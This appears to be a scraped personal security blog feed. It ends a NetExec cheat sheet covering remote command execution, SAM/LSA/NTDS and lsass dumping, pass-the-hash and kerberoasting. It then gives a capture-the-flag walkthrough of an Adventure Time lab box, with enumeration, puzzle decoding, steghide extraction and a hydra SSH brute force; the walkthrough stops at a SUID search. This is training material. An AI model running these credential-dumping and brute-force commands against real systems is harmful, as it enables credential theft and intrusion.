\u0026#39;found_password\u0026#39; -k If you have a tgt ticket:\n1 2 export KRB5CCNAME=ticket.ccache nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;user.name\u0026#39; -p \u0026#39;found_password\u0026#39; --use-kcache Execute commands:\n1 2 3 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;user.name\u0026#39; -p \u0026#39;found_password\u0026#39; -x \u0026#39;command\u0026#39; \u0026lt;--- cmd nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;user.name\u0026#39; -p \u0026#39;found_password\u0026#39; -X \u0026#39;command\u0026#39; \u0026lt;--- Powershell nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;user.name\u0026#39; -p \u0026#39;found_password\u0026#39; -x \u0026#39;powershell.exe -c \u0026#34;GCI C:\\\\\u0026#34;\u0026#39; \u0026lt;--- Powershell without obfuscation If you got admin the first thing to do is dump the sam/lsa:\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;Administrator\u0026#39; -p \u0026#39;admin_pass\u0026#39; --sam 1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;Administrator\u0026#39; -p \u0026#39;admin_pass\u0026#39; --lsa Auth with Hash:\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;USER-DC$\u0026#39; -H \u0026lt;hash\u0026gt; PC name needed.\nntds dump:\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;USER-DC$\u0026#39; -H \u0026lt;hash\u0026gt; --ntds ntds dump of a single user: (better krbtgt)\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;USER-DC$\u0026#39; -H \u0026lt;hash\u0026gt; --ntds --user krbtgt With the hash of the krbtgt we can forge our own tickets.\nModules:\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;Administrator\u0026#39; -p \u0026#39;admin_pass\u0026#39; -M nanodump Get lsass dump and parse the result with pypykatz\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;Administrator\u0026#39; -p \u0026#39;admin_pass\u0026#39; -M lsassy Dumps lsass and parse the result remotely with lsassy\nPut files in the smb share:\n1 nxc smb \u0026lt;URL\u0026gt; -u \u0026#39;Administrator\u0026#39; -p \u0026#39;admin_pass\u0026#39; --put-file file.txt \u0026#39;\\\\file.txt\u0026#39; LDAP 1 nxc ldap -L \u0026lt;--list modules Kerberoast:\n1 nxc ldap \u0026lt;URL\u0026gt; -u \u0026#39;Administrator\u0026#39; -p \u0026#39;admin_pass\u0026#39; --kerberoasting outfile.txt ","date":"2024-01-22T10:00:00+01:00","image":"https://cloud.githubusercontent.com/assets/5151193/17577511/d312ceb4-5f3b-11e6-8de5-8822246289fd.jpg","permalink":"https://simonefelici.github.io/p/netexec-tool-overview/","title":"NetExec Tool Overview"},{"content":"I am going to do a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 nmap -T4 -A 10.10.237.150 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 13:55 EST Nmap scan report for 10.10.237.150 Host is up (0.057s latency). Not shown: 995 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.11.65.91 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -r--r--r-- 1 ftp ftp 1401357 Sep 21 2019 1.jpg | -r--r--r-- 1 ftp ftp 233977 Sep 21 2019 2.jpg | -r--r--r-- 1 ftp ftp 524615 Sep 21 2019 3.jpg | -r--r--r-- 1 ftp ftp 771076 Sep 21 2019 4.jpg | -r--r--r-- 1 ftp ftp 1644395 Sep 21 2019 5.jpg |_-r--r--r-- 1 ftp ftp 40355 Sep 21 2019 6.jpg 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:d2:86:99:c2:62:2d:95:d0:75:9c:4e:83:b6:1b:ca (RSA) | 256 db:87:9e:06:43:c7:6e:00:7b:c3:bc:a1:97:dd:5e:83 (ECDSA) |_ 256 6b:40:84:e6:9c:bc:1c:a8:de:b2:a1:8b:a3:6a:ef:f0 (ED25519) 80/tcp open http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 404 Not Found 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=adventure-time.com/organizationName=Candy Corporate Inc./stateOrProvinceName=Candy Kingdom/countryName=CK | Not valid before: 2019-09-20T08:29:36 |_Not valid after: 2020-09-19T08:29:36 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: You found Finn |_ssl-date: TLS randomness does not represent time 31337/tcp open Elite? | fingerprint-strings: | DNSStatusRequestTCP, RPCCheck, SSLSessionReq: | Hello Princess Bubblegum. What is the magic word? | magic word is not | DNSVersionBindReqTCP: | Hello Princess Bubblegum. What is the magic word? | magic word is not | version | bind | GenericLines, NULL: | Hello Princess Bubblegum. What is the magic word? | GetRequest: | Hello Princess Bubblegum. What is the magic word? | magic word is not GET / HTTP/1.0 | HTTPOptions: | Hello Princess Bubblegum. What is the magic word? | magic word is not OPTIONS / HTTP/1.0 | Help: | Hello Princess Bubblegum. What is the magic word? | magic word is not HELP | RTSPRequest: | Hello Princess Bubblegum. What is the magic word? | magic word is not OPTIONS / RTSP/1.0 | SIPOptions: | Hello Princess Bubblegum. What is the magic word? | magic word is not OPTIONS sip:nm SIP/2.0 | Via: SIP/2.0/TCP nm;branch=foo | From: \u0026lt;sip:nm@nm\u0026gt;;tag=root | \u0026lt;sip:nm2@nm2\u0026gt; | Call-ID: 50000 | CSeq: 42 OPTIONS | Max-Forwards: 70 | Content-Length: 0 | Contact: \u0026lt;sip:nm@nm\u0026gt; |_ Accept: application/sdp 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31337-TCP:V=7.94SVN%I=7%D=1/8%Time=659C452A%P=x86_64-pc-linux-gnu%r SF:(NULL,32,\u0026#34;Hello\\x20Princess\\x20Bubblegum\\.\\x20What\\x20is\\x20the\\x20magi SF:c\\x20word\\?\\n\u0026#34;)%r(GetRequest,57,\u0026#34;Hello\\x20Princess\\x20Bubblegum\\.\\x20Wh SF:at\\x20is\\x20the\\x20magic\\x20word\\?\\nThe\\x20magic\\x20word\\x20is\\x20not\\x SF:20GET\\x20/\\x20HTTP/1\\.0\\n\u0026#34;)%r(SIPOptions,124,\u0026#34;Hello\\x20Princess\\x20Bubb SF:legum\\.\\x20What\\x20is\\x20the\\x20magic\\x20word\\?\\nThe\\x20magic\\x20word\\x SF:20is\\x20not\\x20OPTIONS\\x20sip:nm\\x20SIP/2\\.0\\r\\nVia:\\x20SIP/2\\.0/TCP\\x2 SF:0nm;branch=foo\\r\\nFrom:\\x20\u0026lt;sip:nm@nm\u0026gt;;tag=root\\r\\nTo:\\x20\u0026lt;sip:nm2@nm2\u0026gt; SF:\\r\\nCall-ID:\\x2050000\\r\\nCSeq:\\x2042\\x20OPTIONS\\r\\nMax-Forwards:\\x2070\\ SF:r\\nContent-Length:\\x200\\r\\nContact:\\x20\u0026lt;sip:nm@nm\u0026gt;\\r\\nAccept:\\x20applic SF:ation/sdp\\n\u0026#34;)%r(GenericLines,32,\u0026#34;Hello\\x20Princess\\x20Bubblegum\\.\\x20Wh SF:at\\x20is\\x20the\\x20magic\\x20word\\?\\n\u0026#34;)%r(HTTPOptions,5B,\u0026#34;Hello\\x20Princ SF:ess\\x20Bubblegum\\.\\x20What\\x20is\\x20the\\x20magic\\x20word\\?\\nThe\\x20magi SF:c\\x20word\\x20is\\x20not\\x20OPTIONS\\x20/\\x20HTTP/1\\.0\\n\u0026#34;)%r(RTSPRequest,5 SF:B,\u0026#34;Hello\\x20Princess\\x20Bubblegum\\.\\x20What\\x20is\\x20the\\x20magic\\x20wo SF:rd\\?\\nThe\\x20magic\\x20word\\x20is\\x20not\\x20OPTIONS\\x20/\\x20RTSP/1\\.0\\n\u0026#34; SF:)%r(RPCCheck,75,\u0026#34;Hello\\x20Princess\\x20Bubblegum\\.\\x20What\\x20is\\x20the\\ SF:x20magic\\x20word\\?\\nThe\\x20magic\\x20word\\x20is\\x20not\\x20\\x80\\0\\0\\(r\\xf SF:e\\x1d\\x13\\0\\0\\0\\0\\0\\0\\0\\x02\\0\\x01\\x86\\xa0\\0\\x01\\x97\\|\\0\\0\\0\\0\\0\\0\\0\\0\\0 SF:\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\n\u0026#34;)%r(DNSVersionBindReqTCP,69,\u0026#34;Hello\\x20Princess SF:\\x20Bubblegum\\.\\x20What\\x20is\\x20the\\x20magic\\x20word\\?\\nThe\\x20magic\\x SF:20word\\x20is\\x20not\\x20\\0\\x1e\\0\\x06\\x01\\0\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\\n\u0026#34;)%r(DNSStatusRequestTCP,57,\u0026#34;Hello\\x20Princess\\x SF:20Bubblegum\\.\\x20What\\x20is\\x20the\\x20magic\\x20word\\?\\nThe\\x20magic\\x20 SF:word\\x20is\\x20not\\x20\\0\\x0c\\0\\0\\x10\\0\\0\\0\\0\\0\\0\\0\\0\\0\\n\u0026#34;)%r(Help,4D,\u0026#34;He SF:llo\\x20Princess\\x20Bubblegum\\.\\x20What\\x20is\\x20the\\x20magic\\x20word\\?\\ SF:nThe\\x20magic\\x20word\\x20is\\x20not\\x20HELP\\n\u0026#34;)%r(SSLSessionReq,A1,\u0026#34;Hell SF:o\\x20Princess\\x20Bubblegum\\.\\x20What\\x20is\\x20the\\x20magic\\x20word\\?\\nT SF:he\\x20magic\\x20word\\x20is\\x20not\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\xd7 SF:\\xf7\\xba,\\xee\\xea\\xb2`~\\xf3\\0\\xfd\\x82{\\xb9\\xd5\\x96\\xc8w\\x9b\\xe6\\xc4\\xdb SF:\u0026lt;=\\xdbo\\xef\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\\n\\0f\\0\\x05\\0\\x04\\0e\\0d\\0c\\0b\\0a\\0` SF:\\0\\x15\\0\\x12\\0\\t\\0\\x14\\0\\x11\\0\\x08\\0\\x06\\0\\x03\\x01\\0\\n\u0026#34;); Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 162.12 seconds We see that we have a ftp server with some images in it.\nI downloaded them and tried to upload a file, but it didn’t work out, so I am going to explore the web page.\nIn the http page there is nothing of interest, but in the https page there is a subdirectory that we can look for:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ffuf -u https://10.10.237.150:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://10.10.237.150:443/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms] # Priority ordered case insensative list, where entries were found [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 65ms] # [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms] # or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 63ms] # [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 66ms] # Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 64ms] # This work is licensed under the Creative Commons [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 60ms] # license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 59ms] # on atleast 2 different hosts [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 59ms] # Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms] # Copyright 2007 James Fisher [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms] # directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms] # [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 62ms] # [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 331ms] [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms] candybar [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 66ms] And we got a message:\nWe can decypher with cyberchef:\nFrom there we can find this email address: bubblegum@land-of-ooo.com, which we should put in the hosts file.\nNow that we found jake we should re-enumerate the website:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ffuf -u https://land-of-ooo.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://land-of-ooo.com/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms] # Copyright 2007 James Fisher [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms] # directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 56ms] # This work is licensed under the Creative Commons [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms] # or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms] # [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 54ms] # [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 54ms] # license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 56ms] # Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms] # [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms] # on atleast 2 different hosts [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 59ms] # Priority ordered case insensative list, where entries were found [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 61ms] # Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 328ms] # [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 347ms] yellowdog [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 61ms] [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 58ms] We found another subdirectory\nAnother time:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ffuf -u https://land-of-ooo.com/yellowdog/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://land-of-ooo.com/yellowdog/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ # [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms] # [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 61ms] # Copyright 2007 James Fisher [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 60ms] # directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms] # [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 58ms] # license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 57ms] [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms] # on atleast 2 different hosts [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 58ms] # Priority ordered case insensative list, where entries were found [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms] # or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms] # [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 64ms] # Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms] # This work is licensed under the Creative Commons [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 60ms] # Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 62ms] [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms] bananastock [Status: 301, Size: 334, Words: 20, Lines: 10, Duration: 199ms] And now we got another code:\nThis time we got this:\nI tried to put that in the service running but no luck:\n1 2 3 4 nc 10.10.237.150 31337 Hello Princess Bubblegum. What is the magic word? THE BANANAS ARE THE BEST!!! The magic word is not THE BANANAS ARE THE BEST!!! So I just started another fuzzer\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ffuf -u https://land-of-ooo.com/yellowdog/bananastock/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://land-of-ooo.com/yellowdog/bananastock/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ # directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 63ms] # license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms] [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 54ms] # This work is licensed under the Creative Commons [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 55ms] # [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 54ms] # [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 68ms] # [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 65ms] # Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms] # on atleast 2 different hosts [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms] # or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms] # Copyright 2007 James Fisher [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms] # Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms] # Priority ordered case insensative list, where entries were found [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 56ms] # [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 328ms] [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms] princess [Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 58ms] And finally we got what we were searching:\nThis is either AES or DES,\nIt was AES.\nAnd we got that:\n1 2 3 4 nc 10.10.237.150 31337 Hello Princess Bubblegum. What is the magic word? ricardio The new username is: apple-guards So I tried using ssh with the password that we found before:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ssh apple-guards@10.10.237.150 The authenticity of host \u0026#39;10.10.237.150 (10.10.237.150)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:oousiKsHNim8zwOz0eyM11NPdqD8vdPNZ23JWmvYNSM. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.237.150\u0026#39; (ED25519) to the list of known hosts. apple-guards@10.10.237.150\u0026#39;s password: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-62-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 1 package can be updated. 0 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings No mail. Last login: Sat Sep 21 20:51:11 2019 from 192.168.245.129 apple-guards@at:~$ whoami apple-guards There there are 2 flags, flag1, and flag, the flag one is encrypted in md5.\nSince the hint tells us: (Can you search for someones files?)\nI searched for the files owned by marceline:\n1 2 3 find / -user marceline 2\u0026gt;/dev/null /etc/fonts/helper /home/marceline 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ./helper ====================================== BananaHead Access Pass created by Marceline ====================================== Hi there bananaheads!!! So you found my file? But it won\u0026#39;t help you if you can\u0026#39;t answer this question correct. What? I told you guys I would help and that it wouldn\u0026#39;t cost you a thing.... Well I lied hahahaha Ready for the question? The key to solve this puzzle is gone And you need the key to get this readable: Gpnhkse Did you solve the puzzle? I first tought that was rot13, but after seaching for a while I tried the vigenere one, which requires a key, that in this case would be “gone”\n1 2 3 4 5 What is the word I\u0026#39;m looking for? Abadeer That\u0026#39;s it!!!! You solved my puzzle Don\u0026#39;t tell princess B I helped you guys!!! My password is \u0026#39;My friend Finn\u0026#39; So we got marceline’s password\nAnd we enter ssh with marceline with the password that we just found.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 marceline@at:~$ ls flag2 I-got-a-secret.txt marceline@at:~$ cat I-got-a-secret.txt Hello Finn, I heard that you pulled a fast one over the banana guards. B was very upset hahahahaha. I also heard you guys are looking for BMO\u0026#39;s resetcode. You guys broke him again with those silly games? You know I like you Finn, but I don\u0026#39;t want to anger B too much. So I will help you a little bit... But you have to solve my little puzzle. Think you\u0026#39;re up for it? Hahahahaha....I know you are. 111111111100100010101011101011111110101111111111011011011011000001101001001011111111111111001010010111100101000000000000101001101111001010010010111111110010100000000000000000000000000000000000000010101111110010101100101000000000000000000000101001101100101001001011111111111111111111001010000000000000000000000000001010111001010000000000000000000000000000000000000000000001010011011001010010010111111111111111111111001010000000000000000000000000000000001010111111001010011011001010010111111111111100101001000000000000101001111110010100110010100100100000000000000000000010101110010100010100000000000000010100000000010101111100101001111001010011001010010000001010010100101011100101001101100101001011100101001010010100110110010101111111111111111111111111111111110010100100100000000000010100010100111110010100000000000000000000000010100111111111111111110010100101111001010000000000000001010 Apparently this is spoon code.\n1 The magic word you are looking for is ApplePie And finally we got the magic word.\nWhich tells us the peppermint password.\n1 2 3 4 nc 10.10.237.150 31337 Hello Princess Bubblegum. What is the magic word? ApplePie The password of peppermint-butler is: That Black Magic So now we can switch user and retrieve the flag:\n1 2 su peppermint-butler Password: We can see a picture in the home directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 find / -type f -user peppermint-butler 2\u0026gt;/dev/null | head /usr/share/xml/steg.txt /etc/php/zip.txt /proc/1779/task/1779/fdinfo/0 /proc/1779/task/1779/fdinfo/1 /proc/1779/task/1779/fdinfo/2 /proc/1779/task/1779/fdinfo/255 /proc/1779/task/1779/environ /proc/1779/task/1779/auxv /proc/1779/task/1779/status /proc/1779/task/1779/personality peppermint-butler@at:~$ cat /usr/share/xml/steg.txt I need to keep my secrets safe. There are people in this castle who can\u0026#39;t be trusted. Those banana guards are not the smartest of guards. And that Marceline is a friend of princess Bubblegum, but I don\u0026#39;t trust her. So I need to keep this safe. The password of my secret file is \u0026#39;ToKeepASecretSafe\u0026#39; peppermint-butler@at:~$ cat /etc/php/zip.txt I need to keep my secrets safe. There are people in this castle who can\u0026#39;t be trusted. Those banana guards are not the smartest of guards. And that Marceline is a friend of princess Bubblegum, but I don\u0026#39;t trust her. So I need to keep this safe. The password of my secret file is \u0026#39;ThisIsReallySave\u0026#39; Using “ToKeepASecretSafe” as a password, we are able to find a zip file in the image:\n1 2 3 steghide extract -sf butler-1.jpg Enter passphrase: wrote extracted data to \u0026#34;secrets.zip\u0026#34;. The zip is protected by a password, and we can unzip it using the other password “ThisIsReallySave”:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 unzip secrets.zip cat secrets.txt [0200 hours][upper stairs] I was looking for my arch nemesis Peace Master, but instead I saw that cowering little puppet from the Ice King.....gunter. What was he up to, I don\u0026#39;t know. But I saw him sneaking in the secret lab of Princess Bubblegum. To be able to see what he was doing I used my spell \u0026#39;the evil eye\u0026#39; and saw him. He was hacking the secret laptop with something small like a duck of rubber. I had to look closely, but I think I saw him type in something. It was unclear, but it was something like \u0026#39;The Ice King s????\u0026#39;. The last 4 letters where a blur. Should I tell princess Bubblegum or see how this all plays out? I don\u0026#39;t know....... So now we know that the password starts with The Ice King s and has other 4 characters.\nI used https://scrabblewordfinder.org/5-letter-words-starting-with/s to built a text file of possible that I’ll use with hydra.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 hydra -l gunter -P passwords_gunter.txt ssh://10.10.237.150 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-07 17:39:09 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 1564 login tries (l:1/p:1564), ~98 tries per task [DATA] attacking ssh://10.10.237.150:22/ [STATUS] 181.00 tries/min, 181 tries in 00:01h, 1388 to do in 00:08h, 16 active [STATUS] 124.00 tries/min, 372 tries in 00:03h, 1197 to do in 00:10h, 16 active [STATUS] 117.57 tries/min, 823 tries in 00:07h, 748 to do in 00:07h, 16 active [STATUS] 115.25 tries/min, 1383 tries in 00:12h, 188 to do in 00:02h, 16 active [22][ssh] host: 10.10.237.150 login: gunter password: The Ice King sucks 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 7 final worker threads did not complete until end. [ERROR] 7 targets did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-07 17:51:33 So, now we can go to the gunter home and retrieve the flag.\nNow I am going to search for root SUIDs:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 find / -user root -perm -u=s 2\u0026gt;/dev/null /usr/sbin/pppd /usr/sbin/exim4 /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/xorg/Xorg.wrap /usr/lib/dbus-1.0/dbus-daemon-launch-helper 